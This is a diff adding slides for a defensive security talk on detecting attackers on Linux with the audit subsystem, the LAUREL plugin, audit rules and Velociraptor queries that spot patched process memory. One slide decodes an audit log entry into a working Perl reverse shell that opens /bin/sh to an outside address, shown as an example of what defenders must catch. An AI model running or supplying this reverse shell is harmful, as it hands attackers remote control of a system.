@@ -1,0 +1,421 @@
+#+TITLE: Detection and Response for Linux without EDR
+#+AUTHOR: Hilko Bengen
+#+DATE: 2024-12-07
+# bengen@hilluzination.de / https://github.com/hillu / @hillu@infosec.exchange
+
+# -> intro
+
+* Some Conventional Wisdom
+
+Opinions to pick from
+- (Some) Linux enthusiasts:
+  "Linux is inherently secure enough. Leave me alone!"
+- (Some) Enterprise security enthusiasts:
+  "Linux lacks observability. Can't work like this!"
+- Red team:
+  "LOL, it's always so easy to persist on Unix systems."
+- Blue team:
+  "Oh my, on Windows, there's at least Sysmon."
+  
+* System Logs
+
+# -> detection basics
+
+- e.g. =/var/log/messages=, =/var/log/auth.log=
+- Easy to collect
+- The usual suspects: =sudo=, =ssh=, =cron=, etc.
+- Need context to detect anything
+- Not sufficient for catching attackers
+
+* Beyond Syslog
+
+- Want to detect unusual, suspicious behavior, e.g.:
+  - Webshells
+  - Reverse shells
+  - Reconnaissance
+  - "fileless" implants injected into processes
+  - BPF seems interesing for attackers
+- Need better telemetry!
+  - Program executions
+  - File watches
+  - Special case syscalls
+
+* Linux Audit Subsystem
+
+# -> better telemetry
+
+- Good for logging:
+  - Program execution
+  - File operations
+  - Syscalls
+  - SELinux, AppArmor events
+
+- Stable, boring technology!
+  - In kernel since mid-2000s
+  - Basic format is well documented
+  - Semantics are well understood
+
+# * Linux Audit Subsystem
+
+# #+begin_src text
+#           .-------+.              
+#           |       '-+                  
+#           | Ruleset +                    
+#   .-------+--.      |     .--------.     
+#   |          +------'     |        |       +--------+
+#   | auditctl |            | auditd +--+--->| plugin |
+#   |          |            |        |   \   +--+-----+--+
+#   '--------+-'            +------+-'    '---->| plugin |
+#             \       raw   ^       \           +--------+
+#    configure \     events/         v   
+#               v         /           +-------+-.
+#         +-.----+-------+----.-+     |log files|
+#         | | Audit subsystem | |     '---------'
+#         | '-----------------' |
+#         | Linux Kernel        |
+#         +---------------------'
+# #+end_src
+
+* Linux Audit Subsystem
+
+# Image
+
+#+ATTR_HTML: :height 600px :align center
+[[file:audit.svg]]
+
+* Linux Audit Subsystem, LOL
+
+# -> linux audit problem
+
+# type=SYSCALL msg=audit(1626611363.720:348501): arch=c000003e syscall=59 success=yes exit=0 a0=55c094deb5c0 a1=55c094dea770 a2=55c094dbf1b0 a3=fffffffffffff286 items=3 ppid=722076 pid=724395 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts3 ses=3 comm="perl" exe="/usr/bin/perl" subj==unconfined key=(null)ARCH=x86_64 SYSCALL=execve AUID="user" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
+
+#+begin_src sh
+type=SYSCALL msg=audit(1626611363.720:348501): …
+type=EXECVE msg=audit(1626611363.720:348501): argc=3 a0="perl"
+  a1="-e" a2=75736520536F636B65743B24693D2231302E302E302E31223B24
+  703D313233343B736F636B657428532C50465F494E45542C534F434B5F53545
+  245414D2C67657470726F746F62796E616D6528227463702229293B69662863
+  6F6E6E65637428532C736F636B616464725F696E2824702C696E65745F61746
+  F6E282469292929297B6F70656E28535444494E2C223E265322293B6F70656E
+  285354444F55542C223E265322293B6F70656E285354444552522C223E26532
+  2293B6578656328222F62696E2F7368202D6922293B7D3B
+type=CWD msg=audit(1626611363.720:348501): …
+#+end_src
+
+# type=CWD msg=audit(1626611363.720:348501): cwd="/root"
+# type=PATH msg=audit(1626611363.720:348501): item=0 name="/usr/bin/perl" inode=401923 dev=fd:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+# type=PATH msg=audit(1626611363.720:348501): item=1 name="/usr/bin/perl" inode=401923 dev=fd:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+# type=PATH msg=audit(1626611363.720:348501): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=404797 dev=fd:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+# type=PROCTITLE msg=audit(1626611363.720:348501): proctitle=7065726C002D650075736520536F636B65743B24693D2231302E302E302E31223B24703D313233343B736F636B657428532C50465F494E45542C534F434B5F53545245414D2C67657470726F746F62796E616D6528227463702229293B696628636F6E6E65637428532C736F636B616464725F696E2824702C696E65745F6174
+
+- Parsing is hard for SIEM software
+- Few filtering options
+
+* Linux Audit Subsystem, LOL
+
+So, what is this =EXECVE.a2=?
+#+begin_src perl
+use Socket; $i="10.0.0.1"; $p=1234;
+socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
+if (connect(S, sockaddr_in($p, inet_aton($i)))) {
+open(STDIN, ">&S"); open(STDOUT, ">&S"); open(STDERR, ">&S");
+exec("/bin/sh -i"); };
+#+end_src
+
+* Our solution
+
+#+ATTR_HTML: :height 150px :align center
+[[file:laurel.svg]]
+
+"Linux Audit – Usable, Robust, Easy Logging"
+- /auditd/ plugin: Parse audit log, write JSON
+- Enrichment, process tracking and labelling
+- Filtering capabilities
+- https://github.com/threathunters-io/laurel, GPLv3
+
+# -> detect summary
+
+* Our solution
+
+# Image
+
+#+ATTR_HTML: :height 600px :align center
+[[file:audit-laurel.svg]]
+
+* EDR? On Linux? Interesting.
+
+- "Our work so far has been basic, common sense"
+- "Let's see if we can do better with an off-the-shelf product"
+
+* Made for Windows.
+
+# -> Made for Windows
+
+- "=CreateProcess=. What is =fork=, =exec=?"
+- "=root= = 'S-1-5-18'. Everybody knows that"
+- "What's a numeric user ID?"
+- "What are groups?"
+- "Filenames are all valid Unicode. Right?"
+
+* Response and Hunting
+
+# -> Response
+
+- Get context for alerts
+- simple tasks
+  - inspect files
+  - =ps=
+  - =netstat=
+- Use YARA rules to hunt for specific files
+- Find process anomalies
+- Running custom tools would be great!
+
+* Velociraptor
+
+#+ATTR_HTML: :height 150px :align center
+[[file:velo.svg]]
+- "digital forensic and incident response tool"
+- /Velociraptor Query Language/
+- Some assembly required
+- Excellent support
+- https://docs.velociraptor.app, AGPLv3
+
+* Support infrastructure
+
+- Diagnosis scripts to check for misconfiguration
+  - Simplify support cases
+- RPM+DEB packages
+  - Reduce mistakes made in installation
+
+* Example: Audit config manipulation
+
+Watch for file write operations and label them
+#+begin_src sh
+  -w /etc/group           -p wa -k wr_etc_main
+  -w /etc/passwd          -p wa -k wr_etc_main
+  -w /etc/shadow          -p wa -k wr_etc_main
+  -w /etc/pam.conf        -p wa -k wr_etc_main
+  -w /etc/pam.d/          -p wa -k wr_etc_main
+  -w /etc/ssh/sshd_config -p wa -k wr_etc_main
+
+  -w /etc/sudoers         -p wa -k wr_sudo
+  -w /etc/sudoers.d       -p wa -k wr_sudo
+#+end_src
+Also for:
+
+=cron/at= – =systemd= – =ld.so= – SELinux/Apparmor – Kernel modules – =auditd/laurel= – etc.
+
+* Example: Audit program execution
+
+Watch for program execution. LAUREL can use key as label that is inheried by child processes.
+#+begin_src sh
+  -w /usr/sbin/sshd -p x -k sshd
+
+  -w /usr/bin/rpm     -p x -k pkg_mgmt
+  -w /usr/bin/dnf     -p x -k pkg_mgmt
+  -w /usr/bin/dpkg    -p x -k pkg_mgmt
+  -w /usr/bin/apt-get -p x -k pkg_mgmt
+  # […]
+
+  -w /usr/bin/containerd -p x -k container
+  -w /usr/bin/podman     -p x -k container
+  -w /usr/bin/runc       -p x -k container
+  # […]
+#+end_src
+Also for:
+
+web servers – =cron= / =at= – etc.
+
+* Example: Audit for specific syscalls
+
+Idea: Allowlist specific processes for ptrace, syscall activity
+
+=ptrace(2)= – but not =PEEK=, =POKE=, =CONT=
+#+begin_src sh
+  -a never,exit -F arch=b32 -S ptrace -F a0>=1 -F a0<=7
+  -a never,exit -F arch=b64 -S ptrace -F a0>=1 -F a0<=7
+  -a always,exit -F arch=b32 -S ptrace
+  -a always,exit -F arch=b64 -S ptrace
+#+end_src
+=bpf(2)= – but not =BPF_MAP_LOOKUP_ELEM= etc.
+#+begin_src sh
+  -a never,exit -F arch=b32 -S bpf -F a0>=1 -F a0<=4
+  -a never,exit -F arch=b64 -S bpf -F a0>=1 -F a0<=4
+  -a never,exit -F arch=b32 -S bpf -F a0>=0xb -F a0<=0xf
+  -a never,exit -F arch=b64 -S bpf -F a0>=0xb -F a0<=0xf
+  -a never,exit -F arch=b32 -S bpf -F a0=0x13
+  -a never,exit -F arch=b64 -S bpf -F a0=0x13
+  -a always,exit -F arch=b32 -S bpf -F success=1
+  -a always,exit -F arch=b64 -S bpf -F success=1
+#+end_src
+
+* Example: Audit Kernel module manipulation
+
+#+begin_src sh
+  -a always,exit -F arch=b32 -S init_module,finit_module,delete_module \
+     -k module
+  -a always,exit -F arch=b64 -S init_module,finit_module,delete_module \
+     -k module
+#+end_src
+#+begin_src sh
+  -w /etc/modprobe.conf -p wa -k wr_modules
+  -w /etc/modprobe.d/   -p wa -k wr_modules
+  -w /lib/modules/      -p wa -k wr_modules
+#+end_src
+* Example: Audit raw disk access
+#+begin_src sh
+  -a always,exit -F arch=b32 -S open,openat,openat2 \
+     -F filetype=block -F perm=wa -F success=1 -k raw_write
+  -a always,exit -F arch=b64 -S open,openat,openat2 \
+     -F filetype=block -F perm=wa -F success=1 -k raw_write
+  -a always,exit -F arch=b32 -S open,openat,openat2 \
+     -F filetype=block -F perm=r -F success=1 -k raw_read
+  -a always,exit -F arch=b64 -S open,openat,openat2 \
+     -F filetype=block -F perm=r -F success=1 -k raw_read
+#+end_src
+
+* Example: Find patched processes using VQL
+
+Privileged attackers can write to =/proc/$PID/mem=, bypassing individual
+page permissions. But this leaves some traces.
+
+- Inspect executable mappings from =/proc/$PID/maps=
+- Find modified (present but not file-backed) pages using =/proc/$PID/pagemap=
+
+* Example: Find patched processes using VQL
+
+Parse =/proc/$PID/maps=:
+#+begin_src 
+55c17294f000-55c172954000 r--p 00000000 fd:01 395639 /usr/sbin/auditd
+55c172954000-55c17296a000 r-xp 00005000 fd:01 395639 /usr/sbin/auditd
+55c17296a000-55c172973000 r--p 0001b000 fd:01 395639 /usr/sbin/auditd
+...
+#+end_src
+#+begin_src sql
+  LET maps_regex <= 
+      '''^(?P<Start>[0-9a-f]+)-(?P<End>[0-9a-f]+)''' +
+      '''\s+(?P<Perm>[a-z-]{4})''' +
+      '''\s+(?P<Offset>[0-9a-f]+)''' +
+      '''\s+(?P<DevMajor>[0-9a-f])+:(?P<DevMinor>[0-9a-f]+)''' +
+      '''\s+(?P<Inode>\d+)''' +
+      '''\s+(?P<Filename>.*?)''' +
+      '''(?P<Deleted> \(deleted\))?$'''
+#+end_src
+* Example: Find patched processes using VQL
+Parse =/proc/$PID/maps:=
+#+begin_src sql
+  LET get_maps(pid) =
+      SELECT
+          atoi(string="0x" + Record.Start) AS Start,
+          atoi(string="0x" + Record.End) AS End,
+          Record.Perm AS Perm,
+          Record.Filename AS Filename
+      FROM foreach(
+          row = { SELECT * FROM parse_lines(
+                      filename=format(format="/proc/%d/maps", args=pid) ) },
+          query = { SELECT parse_string_with_regex(
+                      regex=maps_regex, string=Line) AS Record
+                    FROM scope() }
+      )
+#+end_src
+
+* Example: Find patched processes using VQL
+Parse =/proc/$PID/pagemap=:
+#+begin_src sql
+  LET PAGESIZE <= 4096 -- may dffer on !x86
+  LET pagemap_template(start_address, end_address) =
+      format(
+          format='''[
+          ["pagemap", 0, [
+                 ["PFN", %[1]d, Array, { 
+                     type: "uint64",
+                     count: %[2]d,
+                     max_count: %[2]d,
+                 }],
+             ]]]''',
+          args=[ int( int=8 * start_address / PAGESIZE ),
+                 int( int=(end_address-start_address) / PAGESIZE ) ] )
+
+#+end_src
+* Example: Find patched processes using VQL
+Get PFNs for executable mappings
+#+begin_src sql
+  LET get_pfns(pid) =
+      SELECT BaseAddress, PageMap
+      FROM foreach(
+          row = {  SELECT Start, End FROM get_maps(pid=pid)
+              WHERE Perm =~ "x" AND Filename =~ "^/"
+              AND NOT Filename =~ "^/memfd:" },
+          query = { SELECT Start AS BaseAddress,
+              parse_binary( filename=format(format="/proc/%d/pagemap",
+                  args=pid),
+                  profile=pagemap_template( start_address=Start,
+                                            end_address=End ),
+                  struct="pagemap" ).PFN AS PageMap
+              FROM scope() }
+      )
+#+end_src
+* Example: Find patched processes using VQL
+#+begin_src sql
+  LET modified_executable_pages(pid) =
+      SELECT Page AS TaintedPage
+      FROM foreach(
+        row = get_pfns(pid=pid),
+        uery={
+          SELECT format(format="%012x", args=[BaseAddress + PAGESIZE * _key])
+                 AS Page,
+                 format(format="%064b", args=[_value._value])
+                 AS mapping
+          FROM items(item={SELECT * FROM foreach(row=PageMap)}) })
+      WHERE mapping =~ "^1.0"
+      -- bit 63 (present) = 1
+      -- bit 61 (file-backed) = 0
+#+end_src
+* Example: Find patched processes using VQL
+Tying it all together
+#+begin_src sql
+  LET process_exe_regex = "^/"
+  SELECT *
+  FROM foreach(
+      row={SELECT Pid, Exe FROM pslist() WHERE Exe =~ process_exe_regex},
+      query={
+          SELECT
+              Exe,
+              array(a=modified_executable_pages( pid=Pid ).TaintedPage ) 
+          AS TaintedPages
+          FROM scope()
+          WHERE len(list=TaintedPages) > 0
+      })
+#+end_src
+
+# #+begin_src text
+| Pid     | Exe              | TaintedPages     |
+|---------+------------------+------------------|
+| 1238941 | /usr/sbin/auditd | [ 55c172969000 ] |
+|---------+------------------+------------------|
+# #+end_src
+
+* Conclusion
+
+- The state of securitng Linux systems enterprise environment *can* be improved
+- Commercial Vendors seem to be surprisingly bad at this.
+- You can get surprisingly far using built-in facilities and free/open-source software, and some common sense
+
+# wrapping up
+
+# the state of securing / defending Linux systems can certainly be improved
+# not everything is lost
+
+# I like to think that 
+
+* Contact info
+
+#+ATTR_HTML: :height 120px
+[[file:avatar.jpg]]
+
+Hilko Bengen <bengen@hilluzination.de>
+| https://github.com/hillu | @hillu@infosec.exchange |
+
+Slides are available online:
+#+ATTR_HTML: :height 150px
+[[file:talk-url.png]]
